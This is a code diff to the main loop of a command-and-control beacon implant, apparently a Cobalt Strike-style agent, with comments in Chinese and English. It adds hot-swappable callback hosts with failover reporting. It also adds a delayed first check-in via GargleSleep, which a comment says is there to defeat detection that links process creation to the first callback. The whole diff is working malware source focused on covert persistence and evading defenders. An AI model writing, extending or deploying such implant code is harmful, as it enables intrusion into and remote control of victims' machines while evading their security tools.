@@ -10,6 +10,7 @@
 #include "parse.h"
 #include "bformat.h"
 #include "track_memory.h"
+#include "hostcfg.h"
 
 #define MAX_GET setting_int(SETTING_MAXGET)
 
@@ -167,6 +168,18 @@ void beacon(LPVOID lpReserved) {
 	/* 初始化代理 */
 	agent_init(buffer, MAX_GET);
 
+	/* 4.10 beacon_config host 热换：从烘焙 host 列表播种运行时覆盖层
+	 * （首个 beacon_config host 动词之前主循环仍走烘焙 strategy 路径） */
+	hostcfg_init(hosts);
+
+	/* 4.13 checkin_delay：把首次查入按 profile 设定延后，破"进程创建→
+	 * 首次回连"的事件关联启发式。默认 0（不延迟，活测快速通道不受影响） */
+	{
+		unsigned int checkin_delay = setting_int(SETTING_CHECKIN_DELAY);
+		if (checkin_delay > 0 && checkin_delay < 0x7FFFFFFF)
+			GargleSleep(checkin_delay);
+	}
+
 	/* official semantics: sleep 0 = interactive (check in as fast as
 	 * possible), never loop exit. The old `while (sleep_time > 0)` gate
 	 * killed the beacon the moment a sleep-0 task landed: the own-exe
@@ -176,9 +189,13 @@ void beacon(LPVOID lpReserved) {
 	while (TRUE) {
 		// dlog("beacon.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n");
 
-		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
+		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
+		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
+		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
+			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
+			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
+		}
 		failedHost = FALSE;
-		_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 
 		/* 4.12 UDC2: once the channel BOF is loaded (data-store handoff
 		 * during the first HTTP cycles) the WHOLE cycle runs through it.
@@ -280,6 +297,9 @@ void beacon(LPVOID lpReserved) {
 			// dlog("beacon.beacon - Connection Failed: Beacon Domain: %s \n", beacon_domain);
 			failedHost = TRUE;
 		}
+
+		/* 4.10 beacon_config：周度健康上报（failover 统计 + 重连通知） */
+		hostcfg_note(beacon_domain, length != -1);
 
 		http_close();
 
